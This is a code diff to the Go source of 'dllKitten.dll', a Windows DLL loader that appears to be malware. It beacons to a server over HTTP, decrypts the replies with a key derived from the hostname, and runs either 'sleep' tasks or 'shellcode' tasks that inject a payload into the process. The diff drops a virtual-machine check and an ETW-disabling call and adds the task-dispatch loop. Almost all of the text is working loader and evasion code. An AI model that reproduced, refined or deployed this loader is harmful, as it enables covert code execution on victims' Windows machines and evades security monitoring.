@@ -1,3 +1,5 @@
+//go:build windows
+
 // go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o dllKitten.dll
 package main
 
@@ -31,9 +33,6 @@ func main() {
 
 //export Init
 func Init() {
-	if malwareUtil.VmCheck() {
-		return
-	}
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	sleepTime, _ = strconv.Atoi(conf[2])
@@ -53,27 +52,31 @@ func Init() {
 			break
 		}
 	}
-	// if the response is not a shellcode, sleep and try again
 	for {
-		if len(body) > 10 {
-			break
-		}
-		t, _ := strconv.Atoi(string(body))
-		malwareUtil.Sleep(t)
 		body, err = malwareUtil.Request(cookieName, conf)
-		if err != nil || len(body) == 0 {
-			malwareUtil.Sleep(sleepTime)
+		// if the response is not a shellcode, sleep and try again
+		if len(body) < 10 {
+			t, _ := strconv.Atoi(string(body))
+			malwareUtil.Sleep(t)
+			if err != nil || len(body) == 0 {
+				malwareUtil.Sleep(sleepTime)
+			}
+		} else {
+			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
+			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
+			task, _ := malwareUtil.UnmarshalJSON(hexSc)
+			switch task.Tag {
+			case "shellcode":
+				shellcode, _ := hex.DecodeString(string(task.Payload))
+				//inject the shellcode
+				inject(shellcode)
+				return
+			case "sleep":
+				sleepTime, _ = strconv.Atoi(string(task.Payload))
+				malwareUtil.Sleep(sleepTime)
+			}
 		}
 	}
-	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
-	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
-	shellcode, _ := hex.DecodeString(string(hexSc))
-	//get the current process handle
-	handle := windows.CurrentProcess()
-	//disable etw for the current process
-	malwareUtil.EtwHell(uintptr(handle))
-	//inject the shellcode
-	inject(shellcode)
 }
 
 func inject(shellcode []byte) {
